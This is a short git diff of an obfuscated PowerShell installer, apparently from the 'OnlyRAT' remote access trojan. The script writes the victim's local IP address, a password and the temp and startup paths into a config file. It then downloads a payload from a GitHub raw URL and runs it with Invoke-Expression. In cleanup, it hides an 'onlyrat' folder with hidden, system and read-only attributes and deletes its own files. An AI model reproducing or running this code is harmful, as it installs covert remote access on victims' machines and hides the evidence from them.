@@ -44,7 +44,7 @@ $AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne
 Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # local ip addr
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP # pass
 Add-Content -Path $CRYnrkaDbe -Value $env:temp # temp
-Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs # startup
+Add-Content -Path $CRYnrkaDbe -Value $pwd # startup
 Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote host
 Add-Content -Path $CRYnrkaDbe -Value "N/A" # remote port
 Add-Content -Path $CRYnrkaDbe -Value 'local' # connection type
@@ -55,9 +55,7 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloa
 Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"
 
 # cleanup
-Set-Location C:\Users
-attrib +h +s +r onlyrat 
-Set-Location $NyZnoLKCIs
+attrib +h +s +r C:/Users/onlyrat 
 Remove-Item $CRYnrkaDbe
 Remove-Item lawFvVTikZ.txt
 Remove-Item KFPGaEYdcz.ps1
